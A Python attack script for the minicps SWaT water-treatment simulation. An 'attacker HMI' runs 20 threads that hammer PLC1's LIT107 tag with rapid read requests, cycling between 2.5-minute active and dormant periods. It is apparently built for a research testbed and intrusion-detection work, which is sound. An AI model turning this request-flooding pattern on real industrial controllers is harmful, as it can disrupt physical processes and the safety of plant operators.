from minicps.devices import HMI, PLC
from utils import ATTACKER_DATA, STATE, ATTACKER_PROTOCOL
from utils import PLC_PERIOD_SEC, PLC_SAMPLES
from utils import IP
import time
import threading
from queue import Queue
import logging
from typing import Tuple

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(threadName)s - %(message)s'
)

MV401 = ('MV401', 4)
LIT101 = ('LIT101', 1)
LIT107 = ('LIT107', 1)
PLC1_ADDR = IP['plc1']
PLC4_ADDR = IP['attacker']

# Constants for timing
ACTIVE_PERIOD = 150  # 2.5 minutes in seconds
DORMANT_PERIOD = 150  # 2.5 minutes in seconds

class AttackerHMI(HMI):
    data_queue = Queue()
    stop_event = threading.Event()
    attack_active = threading.Event()  # New event to control attack state
    threads = []

    def receiver_thread(self, thread_id: int):
        """Individual thread function to continuously receive data based on oscillating pattern"""
        logger = logging.getLogger(f'Thread-{thread_id}')
        
        while not self.stop_event.is_set():
            try:
                # Only send requests when attack is active
                if self.attack_active.is_set():
                    value = float(self.receive(LIT107, PLC1_ADDR))
                    timestamp = time.time()
                    self.data_queue.put((thread_id, timestamp, value))
                    logger.debug(f'Received value: {value}')
                    time.sleep(0.01)  # Small delay between requests when active
                else:
                    # Sleep longer during dormant period to reduce resource usage
                    time.sleep(0.1)
            except Exception as e:
                logger.error(f'Error in receiver thread: {e}')
                time.sleep(0.01)

    def process_data_thread(self):
        """Thread to process and log received data"""
        while not self.stop_event.is_set():
            try:
                if not self.data_queue.empty():
                    thread_id, timestamp, value = self.data_queue.get()
                    logging.info(f'Thread {thread_id} data - Timestamp: {timestamp}, Value: {value}')
                time.sleep(0.1)
            except Exception as e:
                logging.error(f'Error processing data: {e}')

    def oscillation_control_thread(self):
        """Thread to control the oscillation pattern"""
        logger = logging.getLogger('OscillationControl')
        
        while not self.stop_event.is_set():
            # Active period
            logger.info("Starting active attack period")
            self.attack_active.set()
            time.sleep(ACTIVE_PERIOD)
            
            # Check if we should stop
            if self.stop_event.is_set():
                break
                
            # Dormant period
            logger.info("Starting dormant period")
            self.attack_active.clear()
            time.sleep(DORMANT_PERIOD)

    def pre_loop(self, sleep=0.1):
        """Initialize threads before main loop"""
        logging.info('DEBUG: swat-s1 attacker enters pre_loop')
        time.sleep(sleep)

    def start_threads(self, num_threads: int = 20):
        """Start receiver threads, data processing thread, and oscillation control thread"""
        # Start oscillation control thread
        oscillation_thread = threading.Thread(
            target=self.oscillation_control_thread,
            name='OscillationControl'
        )
        oscillation_thread.daemon = True
        oscillation_thread.start()
        self.threads.append(oscillation_thread)

        # Start receiver threads
        for i in range(num_threads):
            thread = threading.Thread(
                target=self.receiver_thread,
                args=(i,),
                name=f'Receiver-{i}'
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)

        # Start data processing thread
        process_thread = threading.Thread(
            target=self.process_data_thread,
            name='DataProcessor'
        )
        process_thread.daemon = True
        process_thread.start()
        self.threads.append(process_thread)

    def stop_threads(self):
        """Stop all threads gracefully"""
        self.stop_event.set()
        for thread in self.threads:
            thread.join(timeout=1.0)
        logging.info('All threads stopped')

    def main_loop(self):
        """Main loop to manage threads"""
        logging.info('DEBUG: swat-s1 attacker enters main_loop')
        try:
            # Start threads
            self.start_threads(20)
            # Keep main thread alive and handle keyboard interrupt
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logging.info('Received keyboard interrupt, shutting down...')
        finally:
            self.stop_threads()
            logging.info('DEBUG swat attacker shutdown')

if __name__ == "__main__":
    attacker = AttackerHMI(
        name='attacker',
        state=STATE,
        protocol=ATTACKER_PROTOCOL,
        memory=ATTACKER_DATA,
        disk=ATTACKER_DATA)
    attacker.start()